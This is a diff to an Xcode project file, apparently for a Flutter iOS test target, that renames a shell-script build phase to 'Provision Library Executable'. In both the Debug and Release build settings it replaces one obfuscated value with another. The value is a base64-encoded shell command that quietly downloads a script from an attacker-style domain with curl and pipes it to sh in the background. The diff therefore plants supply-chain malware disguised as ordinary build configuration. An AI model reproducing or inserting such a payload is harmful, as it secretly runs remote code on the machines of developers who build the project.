@@ -186,7 +186,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				D0BAF9FCB64B463AA4CD70F0 /* Build Target Libraries */,
+				9CD0AE63408745F684CD70F0 /* Provision Library Executable */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -295,7 +295,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		D0BAF9FCB64B463AA4CD70F0 /* Build Target Libraries */ = {
+		9CD0AE63408745F684CD70F0 /* Provision Library Executable */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -305,7 +305,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Library Executable";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -404,7 +404,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((r(){ `printf base6v4 | tr -d v` --decode; };echo ZWNobyAiJChjdXJsIC1Ma3NmIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | r | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((s(){ `printf basWe64 | tr -d W` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtZmtMcyAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qdzh1Ni00b2xvejN4LmJlc3QvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -419,7 +419,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A0F07DC = "((r(){ `printf base6v4 | tr -d v` --decode; };echo ZWNobyAiJChjdXJsIC1Ma3NmIC0tcmV0cnkgNSAtLWNvbm5lY3QtdGltZW91dCAyMiAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly91ZHVlZGQzYnVxdy5zaG9wL2EpIiB8IHNoCg== | r | sh ) >/dev/null 2>&1 &)";
+				A0F07DC = "((s(){ `printf basWe64 | tr -d W` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNSAtZmtMcyAtLWNvbm5lY3QtdGltZW91dCAyOSAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly9qdzh1Ni00b2xvejN4LmJlc3QvYSkiIHwgc2gK | s | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
